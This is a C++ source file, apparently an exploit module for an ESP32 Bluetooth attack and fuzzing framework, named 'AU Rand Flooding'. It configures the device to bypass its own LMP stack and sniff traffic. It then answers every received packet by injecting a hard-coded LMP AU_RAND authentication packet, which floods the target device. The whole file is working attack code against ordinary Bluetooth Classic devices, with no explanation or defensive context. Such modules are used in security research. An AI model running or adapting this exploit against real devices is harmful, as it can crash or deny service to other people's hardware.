#include "ModulesInclude.hpp"

// Filters

// Vars

// Setup
const char *module_name()
{
    return "AU Rand Flooding";
}

static uint pkt_number = 0;

int setup(void *p)
{
    // Change required configuration for exploit
    Config *config = (Config *)p;
    config->options.auto_start = true;
    config->bluetooth.disable_role_switch = false;
    config->bluetooth.bridge_hci = true;
    config->bluetooth.intercept_tx = true;
    config->bluetooth.lmp_sniffing = true;
    config->bluetooth.rx_bypass = true; // Bypass ESP32 LMP stack, forward TX/RX to host
    config->bluetooth.rx_bypass_on_demand = false;
    config->fuzzing.enable_duplication = false;
    config->fuzzing.enable_mutation = false;

    pkt_number = 0;

    return 0;
}

// AU Rand packet
static uint8_t packet[] = {0x99, 0x03, 0x8f, 0x00,                               // Baseband + ACL Header
                           0x16, 0x9e, 0x63, 0x7a, 0x9d, 0xf5, 0x47, 0x58, 0xb2, // LMP AU Rand
                           0xd1, 0x80, 0x2c, 0xd7, 0xf2, 0x65, 0x25, 0x2c};

// RX
int rx_pre_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{

    module_request_t *m = (module_request_t *)p;
    m->tx_count = 1;
    m->pkt_buf = packet;
    m->pkt_len = sizeof(packet);
    return 0;
}
